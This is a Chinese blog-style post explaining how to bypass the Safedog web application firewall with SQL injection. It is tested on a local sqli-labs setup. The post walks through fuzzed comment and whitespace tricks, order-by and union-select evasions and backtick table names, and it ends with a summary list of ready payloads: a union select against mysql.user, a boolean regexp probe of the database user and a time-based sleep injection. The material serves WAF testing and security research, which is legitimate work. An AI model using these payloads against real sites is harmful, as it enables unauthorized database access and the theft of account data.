# 安全狗最新版sql注入Bypass

## 前言
文章比较啰嗦，文笔也不好，不想看的可以移到最后看payload

## 环境
```
safedog4.0.2.3957 + PHP5.5 + APACHE2 
```

源码使用得是sqlid-lesson1

 ![file](http://secquan.zzyuncheng.com/4f20414a07d58770d22d64aad6201eaf.png-source)

## 科普

其实几个月前我的贴子，我从判断安全狗拦截位置，然后fuzz出关键字之间/**!50000xxx**/就ok得注释

在mysql数据库中填充为空白得字符
```python
list = ['09', '0A', '0B', '0C', '0D', 'A0', '20']
list1 = ascii = [chr(i) for i in range(36, 48)]
```
注释

```
#
--
--+
/**/
/*char*/
;
```
等等，结合文章
[SQL Injection Bypassing WAF - OWASP](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)

## 实践
这次我也从最简单得开始，哪里拦截就搞哪里

```
order by + 数字 拦截
and union{拦截}select xxx from{拦截}xxx
func{拦截}()
```
order by拦截后面的数字，之前我的方法是1-》01；2-》02，此次使用科学计数法绕过,以及奇特的八进制和16进制
```
0e +0 =0
order by 0e+0
```
![file](http://secquan.zzyuncheng.com/4a9e9ff633c7e47d90053b6c69948bd0.png-source)

在测试union select的时候,本来这个位置是要fuzz的，无意试了下/*!60000x*/，明显这里狗并没有怎么拦截.而这里的注释的意思/*!50000 select*/当mysql版本大于5.0时关注这个命令，小于则不关注,安全狗只会拦截select位置的注入关键字，稍后这个点就可以用到，发现函数调用user()=>/*!user*//*!()*/
![file](http://secquan.zzyuncheng.com/158710742c9e0030e551dd6cc72803cb.png-source)

from跟表名，我测试了一大堆fuzz，结果并没有什么结果，在基友的一个tips下 select * from `````mysql````.user
，到此 union bypass的字符串应该是
![file](http://secquan.zzyuncheng.com/81941edc01c8d35fddc521f9255a3ad0.png-source)
```
select id from user where id = '1' and 0x01 union /*!60000*/select 1,2,3 from `mysql0.user`；
```
![file](http://secquan.zzyuncheng.com/afc8fa1319f41e615fed11c627c7fe96.png-source)

## 别的想法
>布尔注入，因为我bypass的过程一直跟注释有关，因此
```
SELECT * FROM users WHERE id='1'=/*!user () regexp 0x5e72*/ -- +
```
![file](http://secquan.zzyuncheng.com/dafcc7e2a465a8d88d8f2aae691dbfe3.png-source)

![file](http://secquan.zzyuncheng.com/5d59cc9e580f4e672f2034e7f1a5e1e6.png-source)

别的，比如,圈子以前的创建变量
```
SELECT * FROM users WHERE id='1' and sleep/**/((select @a:=if(user/**/() regexp /*!'a'*/, 1, 2)))
```
![file](http://secquan.zzyuncheng.com/ad247773700395840e6061ed9e696a00.png-source)

## 总结

```
union select id from user where id = '1' and 0x01 union /*!60000*/select 1,2,3 from `mysql0.user`
bool  SELECT * FROM users WHERE id='1'=/*!user () regexp 0x5e72*/ -- +
bool SELECT * FROM users WHERE id='1' and sleep/**/((select @a:=if(user/**/() regexp /*!'a'*/, 1, 2)))
```


